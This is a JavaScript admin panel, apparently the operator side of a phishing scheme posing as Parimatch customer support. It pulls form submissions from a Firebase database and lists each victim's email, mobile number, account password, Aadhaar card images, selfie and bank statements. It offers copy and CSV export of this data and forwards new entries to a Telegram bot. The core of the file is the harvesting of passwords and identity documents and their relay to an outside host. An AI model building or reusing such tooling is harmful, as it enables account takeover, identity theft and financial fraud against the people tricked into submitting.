const SITE_ID = "parimatch";

const FIREBASE_CONFIG = {
  apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
  authDomain: "alll-projects-admin-pennal.firebaseapp.com",
  projectId: "alll-projects-admin-pennal",
  storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
  messagingSenderId: "689297868215",
  appId: "1:689297868215:web:2747b19c2da47a31f49432"
};

let _db = null, _unsub = null, _retryTimer = null, _firstLoad = true;

function loadFirebase() {
  return new Promise((resolve, reject) => {
    try {
      if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
      _db = firebase.firestore();
      _db.enablePersistence({ synchronizeTabs: true }).catch(() => {});
      resolve(_db);
    } catch (e) { reject(e); }
  });
}

/* ===== REALTIME LISTENER - PARIMATCH ONLY =====
   Firestore needs a composite index for where(site_id==) + orderBy(created_at),
   and a missing index fails the whole listener. So we order by created_at only
   (single-field index, always present) and drop other sites client-side.
   To switch to the server-side filter, create the composite index from the URL
   Firestore logs, then swap the query below for:
     .where('site_id', '==', SITE_ID).orderBy('created_at', 'desc')            */
function startListener() {
  if (_unsub) { _unsub(); _unsub = null; }
  clearTimeout(_retryTimer);
  _unsub = _db.collection('submissions')
    .orderBy('created_at', 'desc')
    .onSnapshot({ includeMetadataChanges: true }, snap => {
      if (snap.metadata.fromCache && _firstLoad) return;
      const newIds = new Set();
      snap.forEach(d => {
        if (d.data().site_id !== SITE_ID) return;
        newIds.add(d.id);
      });
      if (state.prevIds.size > 0) {
        const fresh = [];
        snap.forEach(d => { if (d.data().site_id === SITE_ID && !state.prevIds.has(d.id)) fresh.push(d.data()); });
        if (fresh.length > 0) {
          fresh.forEach(f => sendTelegramAlert(formatAlert(f)));
          playBeep();
          toast(fresh.length + ' new request' + (fresh.length > 1 ? 's' : ''), 'success');
        }
      }
      state.prevIds = newIds;
      state.allSubs = snap.docs
        .filter(d => d.data().site_id === SITE_ID)
        .map(d => ({ id: d.id, ...d.data() }));
      _firstLoad = false;
      setConn(snap.metadata.fromCache ? 'cached' : 'connected');
      renderHome();
    }, err => {
      console.error(err);
      setConn('error');
      _retryTimer = setTimeout(() => { setConn('connecting'); startListener(); }, 5000);
    });
}

/* ===== TELEGRAM ===== */
const TELEGRAM_CONFIG = {
  botToken: localStorage.getItem('p1tg_bot_token') || '',
  chatId: localStorage.getItem('p1tg_chat_id') || '',
  enabled: localStorage.getItem('p1tg_enabled') === 'true'
};
function saveTelegramConfig() {
  localStorage.setItem('p1tg_bot_token', TELEGRAM_CONFIG.botToken);
  localStorage.setItem('p1tg_chat_id', TELEGRAM_CONFIG.chatId);
  localStorage.setItem('p1tg_enabled', TELEGRAM_CONFIG.enabled);
}
function formatAlert(s) {
  const name = s.user_name || s.name || s.email || 'Unknown';
  return '<b>New Parimatch Request</b>\n' +
    'Type: ' + (s.type || '—') + '\n' +
    'Name: ' + name + '\n' +
    'Email: ' + (s.email || '—') + '\n' +
    'Mobile: ' + (s.mobile || '—') + '\n' +
    'Request ID: ' + (s.request_id || s.reqId || '—') + '\n' +
    'Amount: ' + (s.amount || s.bonus_amount || '—');
}
function sendTelegramAlert(msg) {
  if (!TELEGRAM_CONFIG.enabled || !TELEGRAM_CONFIG.botToken || !TELEGRAM_CONFIG.chatId) return;
  fetch('https://api.telegram.org/bot' + TELEGRAM_CONFIG.botToken + '/sendMessage', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: TELEGRAM_CONFIG.chatId, text: msg, parse_mode: 'HTML' })
  }).then(r => r.json()).catch(() => {});
}

/* ===== SOUND ===== */
function playBeep() {
  if (!state.sound) return;
  try {
    if (!state.audioCtx) state.audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    const ctx = state.audioCtx, o = ctx.createOscillator(), g = ctx.createGain();
    o.connect(g); g.connect(ctx.destination);
    o.frequency.value = 880; o.type = 'sine';
    g.gain.setValueAtTime(0, ctx.currentTime);
    g.gain.linearRampToValueAtTime(0.08, ctx.currentTime + 0.02);
    g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
    o.start(); o.stop(ctx.currentTime + 0.4);
  } catch (e) {}
}

const state = {
  allSubs: [], currentPage: 'home', selectedId: null,
  search: '', range: 'all', type: 'all', sort: 'new',
  selected: new Set(), prevIds: new Set(), sound: false, audioCtx: null
};

const $ = id => document.getElementById(id);

function esc(s) { return s == null ? '' : String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])); }
function toDate(ts) { if (!ts) return null; const d = ts.toDate ? ts.toDate() : new Date(ts); return isNaN(d.getTime()) ? null : d; }
function fmtTime(ts) { const d = toDate(ts); if (!d) return '—'; return d.toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true }); }
function fmtRel(ts) {
  const d = toDate(ts); if (!d) return '—';
  const diff = Date.now() - d.getTime();
  if (diff < 60000) return 'now';
  if (diff < 3600000) return Math.floor(diff / 60000) + 'm';
  if (diff < 86400000) return Math.floor(diff / 3600000) + 'h';
  if (diff < 604800000) return Math.floor(diff / 86400000) + 'd';
  return fmtTime(ts);
}
function isImageUrl(s) { return typeof s === 'string' && /^https?:\/\//i.test(s) && !/\.(mp4|webm|mov)$/i.test(s); }

/* The Parimatch forms save Telegram photo links as
     https://api.telegram.org/bot<TOKEN>/file/photos/x.jpg
   which 404s - the working form is
     https://api.telegram.org/file/bot<TOKEN>/photos/x.jpg
   Rewrite on the fly so already-stored submissions resolve. */
function fixImageUrl(u) {
  if (typeof u !== 'string') return u;
  return u.replace(
    /^(https:\/\/api\.telegram\.org)\/bot([^/]+)\/file\/(.+)$/i,
    '$1/file/bot$2/$3'
  );
}

/* Image fields written by the Parimatch project */
const IMAGE_FIELDS = [
  { key: 'issue_image_url', label: 'Issue Image' },
  { key: 'aadhar_front_url', label: 'Aadhaar Front' },
  { key: 'aadhar_back_url', label: 'Aadhaar Back' },
  { key: 'selfie_url', label: 'Selfie' },
  { key: 'identity_image_url', label: 'Identity Image' },
  { key: 'bank_statement_1_url', label: 'Bank Statement 1' },
  { key: 'bank_statement_2_url', label: 'Bank Statement 2' },
  { key: 'bonus_issue_image_url', label: 'Bonus Issue Image' },
  { key: 'profile_image_url', label: 'Profile Image' }
];

function getType(type) {
  if (!type) return 'Other';
  const t = String(type).toLowerCase();
  if (t.includes('deposit')) return 'Deposit Problem';
  if (t.includes('unlock') || t.includes('unblock')) return 'unlock_withdrawal';
  if (t.includes('withdrawal') || t.includes('withdraw')) return 'Withdrawal Problem';
  if (t.includes('bonus')) return 'bonus_problem';
  if (t.includes('kyc') || t.includes('document')) return 'KYC Problem';
  if (t.includes('bank') && t.includes('statement')) return 'Bank Statement Problem';
  if (t.includes('chat') || t.includes('live')) return 'Live Chat';
  return type;
}
const typeClassMap = {
  'Deposit Problem': 'deposit', 'Withdrawal Problem': 'withdrawal', 'unlock_withdrawal': 'unblock',
  'bonus_problem': 'bonus', 'KYC Problem': 'kyc', 'Bank Statement Problem': 'bank', 'Live Chat': 'chat'
};
function typeClass(t) { return typeClassMap[t] || 'deposit'; }

const STATUSES = ['Pending', 'Processing', 'Rejected', 'Success but not received'];

function setConn(s) {
  const d = $('connDot');
  if (!d) return;
  d.style.background = s === 'connected' ? '#28A745' : s === 'error' ? '#DC3545' : '#F57C00';
}
function toast(msg, type) {
  const t = $('toast');
  if (!t) return;
  t.className = 'toast' + (type ? ' ' + type : '');
  t.textContent = msg;
  requestAnimationFrame(() => t.classList.add('show'));
  setTimeout(() => t.classList.remove('show'), 2200);
}
function askConfirm(title, msg) {
  return new Promise(resolve => {
    $('confirmTitle').textContent = title;
    $('confirmMsg').textContent = msg;
    const ov = $('confirmOverlay');
    const done = val => {
      ov.classList.remove('show');
      $('confirmOk').removeEventListener('click', ok);
      $('confirmCancel').removeEventListener('click', cancel);
      resolve(val);
    };
    const ok = () => done(true), cancel = () => done(false);
    $('confirmOk').addEventListener('click', ok);
    $('confirmCancel').addEventListener('click', cancel);
    ov.classList.add('show');
  });
}

function navigateTo(page, id) {
  state.currentPage = page;
  $('page-home').classList.remove('active');
  $('page-detail').classList.remove('active');
  if (page === 'home') { $('page-home').classList.add('active'); }
  else if (page === 'detail' && id) { state.selectedId = id; $('page-detail').classList.add('active'); renderDetail(id); }
}

function init() {
  document.querySelectorAll('.nav-item').forEach(btn => btn.addEventListener('click', () => navigateTo('home')));
  $('backBtn').addEventListener('click', () => navigateTo('home'));

  $('searchInput').addEventListener('input', e => { state.search = e.target.value.toLowerCase(); renderHome(); });

  $('rangePills').addEventListener('click', e => {
    const b = e.target.closest('.pill'); if (!b) return;
    state.range = b.dataset.range;
    $('rangePills').querySelectorAll('.pill').forEach(p => p.classList.toggle('active', p === b));
    renderHome();
  });
  $('typePills').addEventListener('click', e => {
    const b = e.target.closest('.pill'); if (!b) return;
    state.type = b.dataset.type;
    $('typePills').querySelectorAll('.pill').forEach(p => p.classList.toggle('active', p === b));
    renderHome();
  });
  $('sortBtn').addEventListener('click', () => {
    state.sort = state.sort === 'new' ? 'old' : 'new';
    $('sortBtn').innerHTML = state.sort === 'new' ? 'Newest &#8645;' : 'Oldest &#8643;';
    renderHome();
  });

  $('exportBtn').addEventListener('click', () => {
    const rows = getFiltered();
    if (!rows.length) return toast('Nothing to export', 'error');
    exportCSV(rows, 'filtered');
    toast('Exported ' + rows.length + ' rows', 'success');
  });
  $('selectAllBtn').addEventListener('click', () => {
    const rows = getFiltered();
    const allSel = rows.every(r => state.selected.has(r.id));
    rows.forEach(r => allSel ? state.selected.delete(r.id) : state.selected.add(r.id));
    renderHome();
  });
  $('clearSelBtn').addEventListener('click', () => { state.selected.clear(); renderHome(); });
  $('exportSelBtn').addEventListener('click', () => {
    const rows = state.allSubs.filter(s => state.selected.has(s.id));
    if (!rows.length) return toast('Nothing selected', 'error');
    exportCSV(rows, 'selected');
  });
  $('bulkDeleteBtn').addEventListener('click', async () => {
    const ids = Array.from(state.selected);
    if (!ids.length) return;
    const ok = await askConfirm('Delete Requests', 'Delete ' + ids.length + ' request(s) permanently?');
    if (!ok) return;
    try {
      const batch = _db.batch();
      ids.forEach(id => batch.delete(_db.collection('submissions').doc(id)));
      await batch.commit();
      state.selected.clear();
      toast(ids.length + ' deleted', 'success');
    } catch (e) { console.error(e); toast('Delete failed', 'error'); }
  });

  $('soundBtn').addEventListener('click', () => {
    state.sound = !state.sound;
    $('soundBtn').classList.toggle('active', state.sound);
    if (state.sound) { playBeep(); toast('Sound alerts ON', 'success'); }
    else toast('Sound alerts OFF');
  });

  $('settingsBtn').addEventListener('click', () => {
    $('tgToken').value = TELEGRAM_CONFIG.botToken;
    $('tgChat').value = TELEGRAM_CONFIG.chatId;
    $('tgEnabled').checked = TELEGRAM_CONFIG.enabled;
    $('settingsOverlay').classList.add('show');
  });
  $('settingsClose').addEventListener('click', () => $('settingsOverlay').classList.remove('show'));
  $('settingsOverlay').addEventListener('click', e => { if (e.target === $('settingsOverlay')) $('settingsOverlay').classList.remove('show'); });
  $('settingsSave').addEventListener('click', () => {
    TELEGRAM_CONFIG.botToken = $('tgToken').value.trim();
    TELEGRAM_CONFIG.chatId = $('tgChat').value.trim();
    TELEGRAM_CONFIG.enabled = $('tgEnabled').checked;
    saveTelegramConfig();
    $('settingsOverlay').classList.remove('show');
    toast('Settings saved', 'success');
  });
  $('tgTestBtn').addEventListener('click', () => {
    TELEGRAM_CONFIG.botToken = $('tgToken').value.trim();
    TELEGRAM_CONFIG.chatId = $('tgChat').value.trim();
    if (!TELEGRAM_CONFIG.botToken || !TELEGRAM_CONFIG.chatId) return toast('Token & Chat ID required', 'error');
    saveTelegramConfig();
    sendTelegramAlert('<b>P1-Admin test alert</b>\nConnection working.');
    toast('Test sent', 'success');
  });

  $('imageModalClose').addEventListener('click', () => $('imageModal').classList.remove('show'));
  $('imageModal').addEventListener('click', e => { if (e.target === $('imageModal')) $('imageModal').classList.remove('show'); });
  $('confirmCancel').addEventListener('click', () => $('confirmOverlay').classList.remove('show'));
  $('confirmOverlay').addEventListener('click', e => { if (e.target === $('confirmOverlay')) $('confirmOverlay').classList.remove('show'); });

  loadFirebase().then(() => {
    _db.collection('admin_status').doc('p1admin').set({ online: true, site: SITE_ID, lastSeen: firebase.firestore.FieldValue.serverTimestamp() }, { merge: true });
    window.addEventListener('beforeunload', () => _db.collection('admin_status').doc('p1admin').set({ online: false }, { merge: true }));
    startListener();
  }).catch(e => { console.error(e); setConn('error'); });
}

/* ===== FILTERING ===== */
function getFiltered() {
  const now = new Date();
  const cutoff = state.range === 'all' ? null : new Date(now.getTime() - Number(state.range) * 86400000);
  const q = state.search;
  let rows = state.allSubs.filter(s => {
    if (state.type !== 'all' && getType(s.type) !== state.type) return false;
    if (cutoff) { const d = toDate(s.created_at); if (!d || d < cutoff) return false; }
    if (q) {
      const hay = [s.email, s.mobile, s.user_name, s.name, s.description, s.type, s.request_id, s.reqId, s.game_id, s.amount, s.bonus_amount, s.utr, s.account_number, s.issue_status, s.source]
        .map(v => (v == null ? '' : String(v)).toLowerCase()).join(' ');
      if (!hay.includes(q)) return false;
    }
    return true;
  });
  if (state.sort === 'old') rows = rows.slice().reverse();
  return rows;
}

function renderTypePills() {
  const present = new Set(state.allSubs.map(s => getType(s.type)));
  const box = $('typePills');
  const wanted = ['all'].concat(Array.from(present).sort());
  const html = wanted.map(t =>
    '<button class="pill' + (state.type === t ? ' active' : '') + '" data-type="' + esc(t) + '">' +
    (t === 'all' ? 'All Types' : esc(t)) + '</button>').join('');
  if (box.innerHTML !== html) box.innerHTML = html;
}

/* ===== HOME ===== */
function renderHome() {
  const subs = state.allSubs;
  const now = new Date();
  const startOfDay = new Date(now.getFullYear(), now.getMonth(), now.getDate());
  const startOfWeek = new Date(now); startOfWeek.setDate(now.getDate() - 7);

  let today = 0, week = 0;
  subs.forEach(s => { const d = toDate(s.created_at); if (!d) return; if (d >= startOfDay) today++; if (d >= startOfWeek) week++; });

  $('kpiTotal').textContent = subs.length;
  $('kpiTotalReq').textContent = week;

  renderTypePills();
  const rows = getFiltered();
  $('kpiToday').textContent = today;
  $('listCount').textContent = rows.length + ' request' + (rows.length !== 1 ? 's' : '');

  const n = state.selected.size;
  $('selectBar').hidden = n === 0;
  $('selCount').textContent = n + ' selected';

  renderCards(rows);
}

function renderCards(subs) {
  const list = $('cardList');
  if (!subs.length) {
    list.innerHTML = '<div class="empty-state"><svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg><p>No requests yet</p></div>';
    return;
  }
  list.innerHTML = subs.map(s => {
    const t = getType(s.type);
    const tc = typeClass(t);
    const name = s.user_name || s.name || s.email || 'Unknown';
    const st = s.issue_status || 'Pending';
    const checked = state.selected.has(s.id);
    return '<div class="sub-card' + (checked ? ' selected' : '') + '" data-id="' + esc(s.id) + '">' +
      '<span class="check-box' + (checked ? ' on' : '') + '" data-role="check"></span>' +
      '<img src="USER-ICON/2288510.png" style="width:44px;height:44px;border-radius:12px;object-fit:cover;flex-shrink:0;background:#E8EAED;" alt="user" />' +
      '<div class="sub-info">' +
        '<div class="sub-name">' + esc(name) + '</div>' +
        '<div class="sub-type"><span class="type-badge ' + tc + '">' + esc(t) + '</span>' +
        '<span class="status-badge ' + esc(String(st).toLowerCase().replace(/\s+/g, '-')) + '">' + esc(st) + '</span></div>' +
        '<div class="sub-time">' + fmtRel(s.created_at) + ' · ' + fmtTime(s.created_at).split(' ')[0] + '</div>' +
      '</div>' +
      '<svg class="sub-arrow" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>' +
    '</div>';
  }).join('');

  list.querySelectorAll('.sub-card').forEach(card => {
    card.addEventListener('click', e => {
      if (e.target.dataset.role === 'check') {
        const id = card.dataset.id;
        state.selected.has(id) ? state.selected.delete(id) : state.selected.add(id);
        renderHome();
        return;
      }
      navigateTo('detail', card.dataset.id);
    });
  });
}

/* ===== CSV EXPORT ===== */
function exportCSV(data, tag) {
  const keysSet = new Set(); data.forEach(d => Object.keys(d).forEach(k => keysSet.add(k)));
  const keys = Array.from(keysSet);
  const priority = ['created_at', 'type', 'issue_status', 'email', 'mobile', 'password', 'amount', 'utr', 'withdraw_method', 'request_id', 'game_id', 'description', 'source', 'id'];
  keys.sort((a, b) => { const ia = priority.indexOf(a), ib = priority.indexOf(b); if (ia === -1 && ib === -1) return a.localeCompare(b); if (ia === -1) return 1; if (ib === -1) return -1; return ia - ib; });
  const e = v => { if (v == null) return ''; let s = (v && v.toDate) ? v.toDate().toISOString() : String(v); s = s.replace(/"/g, '""'); return s.search(/[",\n]/) >= 0 ? '"' + s + '"' : s; };
  const csv = '\uFEFF' + keys.join(',') + '\n' + data.map(d => keys.map(k => e(d[k])).join(',')).join('\n');
  const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
  const url = URL.createObjectURL(blob), a = document.createElement('a');
  a.href = url; a.download = 'parimatch_' + tag + '_' + new Date().toISOString().slice(0, 10) + '.csv';
  document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url);
}

/* ===== DETAIL ===== */
function renderDetail(id) {
  const s = state.allSubs.find(x => x.id === id);
  if (!s) { $('detailContent').innerHTML = '<div class="empty-state"><p>Not found</p></div>'; return; }
  const t = getType(s.type);
  const tc = typeClass(t);
  const name = s.user_name || s.name || s.email || 'Unknown';
  const email = s.email || '—';
  const mobile = s.mobile || '—';
  const password = s.password || '—';
  const status = s.issue_status || 'Pending';
  const amount = s.amount || s.bonus_amount || '—';
  const utr = s.utr || 'N/A';
  const method = s.withdraw_method || '—';
  const desc = s.description || '—';
  const gameId = s.game_id || '—';
  // The unlock/bonus forms post reqId + time, the other forms request_id + timestamp.
  const reqId = s.request_id || s.reqId || '—';
  const account = s.account_number || '';
  const source = s.source || '—';
  const when = s.timestamp || s.time || fmtTime(s.created_at);

  const images = IMAGE_FIELDS
    .map(f => ({ label: f.label, url: fixImageUrl(s[f.key]) }))
    .filter(f => isImageUrl(f.url));

  function row(label, value, copyVal) {
    const copyBtn = copyVal !== null && copyVal !== undefined && copyVal !== '—'
      ? '<button class="copy-btn" data-copy="' + esc(String(copyVal)) + '"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Copy</button>' : '';
    return '<div class="detail-row"><span class="detail-label">' + esc(label) + '</span><span class="detail-value">' + esc(String(value)) + copyBtn + '</span></div>';
  }

  let html = '';
  html += '<div class="detail-card"><h3>Identity</h3>';
  html += row('User Name', name);
  html += row('Email ID', email, email);
  html += row('Mobile Number', mobile, mobile);
  html += row('Password', password, password);
  html += '</div>';

  html += '<div class="detail-card"><h3>Request Details</h3>';
  html += row('Problem Type', t);
  html += row('Request ID', reqId, reqId);
  html += row('Game ID', gameId, gameId);
  if (account) html += row('Account Number', account, account);
  if (s.bonus_amount) html += row('Bonus Amount', s.bonus_amount, s.bonus_amount);
  html += row('Amount', amount, amount);
  html += row('UTR', utr);
  html += row('Method', method);
  html += row('Date', when);
  html += row('Source', source);
  html += '</div>';

  html += '<div class="detail-card"><h3>Status</h3><div class="status-options" id="statusOptions">';
  STATUSES.forEach(st => {
    html += '<button class="status-opt' + (st === status ? ' active' : '') + '" data-status="' + esc(st) + '">' + esc(st) + '</button>';
  });
  html += '</div></div>';

  html += '<div class="detail-card"><h3>Description</h3>';
  html += '<div style="font-size:14px;color:var(--text2);line-height:1.6;">' + esc(desc) + '</div></div>';

  html += '<div class="detail-card"><h3>Proof Images (' + images.length + ')</h3><div class="image-section">';
  if (images.length) {
    const hasPrivate = images.some(im => /(^|\/\/)(t\.me|telegram\.me)\//i.test(im.url));
    html += '<div class="img-grid">';
    images.forEach(im => {
      const priv = /(^|\/\/)(t\.me|telegram\.me)\//i.test(im.url);
      html += '<div class="img-item" data-url="' + esc(im.url) + '">' +
        '<div class="img-thumb"><img src="' + esc(im.url) + '" alt="' + esc(im.label) + '" loading="lazy" />' +
        '<span class="img-fallback">' + (priv ? 'Private chat link' : 'Preview blocked') + '</span></div>' +
        '<span class="img-label">' + esc(im.label) + '</span>' +
        '<div class="img-acts">' +
        '<button class="img-act" data-open="' + esc(im.url) + '" title="Open in new tab">' + (priv ? 'Chat' : 'Open') + '</button>' +
        '<button class="img-act" data-dl="' + esc(im.url) + '" title="Download">Save</button>' +
        '</div></div>';
    });
    html += '</div>';
    html += '<p class="img-note">' + (hasPrivate
      ? 'Some photos were saved as private <b>t.me</b> chat links, which a browser cannot preview. Tap <b>Chat</b> to open that message in Telegram, or <b>Save</b> to download.'
      : 'Tap a photo to enlarge, or use <b>Open</b> / <b>Save</b>.') + '</p>';
  } else {
    html += '<div class="image-placeholder">' +
      '<svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>' +
      '<span>No image uploaded</span></div>';
  }
  html += '</div></div>';

  html += '<div class="detail-card"><h3>Actions</h3><div class="action-row">' +
    '<button class="btn-gray btn-sm" id="copyAllBtn">Copy All</button>' +
    '<button class="btn-primary btn-sm" id="openChatBtn">Reply on Chat</button>' +
    '<button class="btn-primary btn-sm" id="delOneBtn" style="background:var(--red);">Delete</button>' +
    '</div></div>';

  $('detailContent').innerHTML = html;

  $('detailContent').querySelectorAll('.copy-btn').forEach(b => {
    b.addEventListener('click', e => {
      e.stopPropagation();
      navigator.clipboard?.writeText(b.dataset.copy).then(() => toast('Copied', 'success')).catch(() => {});
    });
  });

  // Telegram-hosted photos sometimes cannot be shown inline, so hide the broken
  // thumbnail and let Open/Save be the way through. Ones that do load enlarge
  // on tap.
  $('detailContent').querySelectorAll('.img-item').forEach(item => {
    const img = item.querySelector('img');
    const mark = () => item.classList.add('img-blocked');
    if (img.complete && img.naturalWidth === 0) mark();
    else img.addEventListener('error', mark);
    img.addEventListener('click', () => {
      if (img.naturalWidth === 0) return;
      $('modalImage').src = img.src;
      $('imageModal').classList.add('show');
    });
  });

  $('detailContent').querySelectorAll('.img-act').forEach(btn => {
    btn.addEventListener('click', e => {
      e.stopPropagation();
      const url = btn.dataset.open || btn.dataset.dl;
      if (btn.dataset.open) {
        window.open(url, '_blank', 'noopener');
        toast('Opened in new tab', 'success');
      } else {
        const a = document.createElement('a');
        a.href = url; a.download = 'proof_' + Date.now() + '.jpg'; a.target = '_blank'; a.rel = 'noopener';
        document.body.appendChild(a); a.click(); document.body.removeChild(a);
        toast('Downloading...', 'success');
      }
    });
  });

  $('statusOptions').querySelectorAll('.status-opt').forEach(btn => {
    btn.addEventListener('click', async () => {
      const newStatus = btn.dataset.status;
      if (newStatus === status) return;
      $('statusOptions').querySelectorAll('.status-opt').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      try {
        await _db.collection('submissions').doc(id).update({ issue_status: newStatus, admin_updated_at: firebase.firestore.FieldValue.serverTimestamp() });
        s.issue_status = newStatus;
        toast('Status: ' + newStatus, 'success');
        sendTelegramAlert('<b>Status updated</b>\n' + (s.request_id || id) + '\n' + newStatus);
      } catch (e) { console.error(e); toast('Update failed', 'error'); }
    });
  });

  $('copyAllBtn').addEventListener('click', () => {
    const text = ['Type: ' + t, 'Status: ' + status, 'Name: ' + name, 'Email: ' + email, 'Mobile: ' + mobile, 'Password: ' + password, 'Amount: ' + amount, 'UTR: ' + utr, 'Request ID: ' + reqId, 'Game ID: ' + gameId, 'Description: ' + desc].join('\n');
    navigator.clipboard?.writeText(text).then(() => toast('All details copied', 'success')).catch(() => {});
  });

  $('openChatBtn').addEventListener('click', () => window.open('https://chat-page.edgeone.app', '_blank'));

  $('delOneBtn').addEventListener('click', async () => {
    const ok = await askConfirm('Delete Request', 'Delete this request permanently?');
    if (!ok) return;
    try {
      await _db.collection('submissions').doc(id).delete();
      toast('Deleted', 'success');
      navigateTo('home');
    } catch (e) { console.error(e); toast('Delete failed', 'error'); }
  });
}

/* ===== INIT ===== */
document.addEventListener('DOMContentLoaded', init);
